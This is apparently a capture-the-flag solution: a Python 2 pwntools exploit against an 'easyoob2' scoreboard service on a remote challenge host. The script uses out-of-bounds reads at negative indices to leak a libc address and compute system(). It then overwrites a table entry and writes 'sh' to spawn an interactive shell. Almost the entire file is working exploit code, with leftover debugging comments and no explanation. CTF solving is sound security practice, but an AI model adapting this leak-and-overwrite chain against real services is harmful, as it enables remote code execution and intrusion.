#!/usr/bin/python2
from pwn import *
import struct
import sys

lib_start_main_offset = 0x23fc0  #int(sys.argv[1][3:], 16)
system_offset = 0x522c0   		 # int(sys.argv[2][3:], 16)

#got_offset = int(sys.argv[1])
leaks = []
#sh = process('./easyoob2')
sh = remote('challs.nusgreyhats.org', 10526)
#libc = ELF('/lib64/ld-linux-x86-64.so.2')

def pad(payload):
	return payload + '\x00'*(4-len(payload))

def write_entry(pos, uid, score):
	payload = '2 {} {} {}'.format(pos, uid, score)
	sh.sendline(payload)
	return sh.recvuntil('>')

def read_entry(pos):
	payload = '1 {}'.format(pos)
	sh.sendline(payload)
	return sh.recvuntil('>')

def parse_leaks(leak):
	#print leak
	chef = leak.split()
	if len(chef[1]) > 1:
		if chef[1][1] != "\x7f":
			#print len(chef[1])
			addr = str(hex(int(chef[1]) & (2**32-1)))
			return addr
	else:
		return
	chef[1] = pad(chef[1])
	addr = str(hex(u32(chef[1])))
	addr += str(hex(int(chef[2]) & (2**32-1)))[2:]
	return addr

def upperify(pos):
	sh.sendline('3 {}'.format(pos))
	return sh.recvuntil('>')

#print lib_start_main_offset

#print sh.recv()
sh.recvuntil('------------------------------')
sh.recvuntil('------------------------------')
sh.recvuntil('>')

read_entry(1)
write_entry(1, 'aaa', 0)
upperify(1)

offset = 0

for i in range(-25, -10):
	please = parse_leaks(read_entry(i))
 	if please:
		print 'index: {}   addr: {}'.format(i,please)
 		leaks.append(please)
	#offset = i
#read_entry(0)
#leaks.append(parse_leaks(read_entry(-15)))	
print leaks
#base = int(leaks[0][2:], 16)
#print hex(base & 0xfffffffff000)
#chef = read_entry(15)
# 	print chef
# 	# if(chef):
# 	# 	print parse_leaks(chef)
#leaks.append(parse_leaks(chef))
#print leaks

lib_start_main_libc = leaks[0][2:]
lib_start_main_libc = int(lib_start_main_libc, 16)

base_libc = lib_start_main_libc - lib_start_main_offset
system_libc = base_libc + system_offset #- 0xD1A50
difference = lib_start_main_libc - system_libc
# to_overwrite = raw_input("enter some input: ")
print 'lib start main in libc: {}\nsystem in libc: {}\ndifference: {}'.format(hex(lib_start_main_libc), hex(system_libc), hex(difference))
#
# for i in range(400):
# 	write_entry(i, 'gon', 0)
to_send = hex(system_libc)[2:6]
intty = hex(system_libc)[6:]
#intty
first = struct.pack("B", int(to_send[:2], 16))
second = struct.pack("B", int(to_send[2:], 16))
#print '{}{}'.format(second, first)
write_entry(-15, '{}{}'.format(second, first), int(intty, 16))
chef = read_entry(-15)
#print chef
print parse_leaks(chef)
write_entry(0, 'sh', 0)
#gdb.attach(sh)
sh.sendline('3 0')
#sh.sendline('ls')
#print sh.recv()
#sh.sendline('4')
sh.interactive()

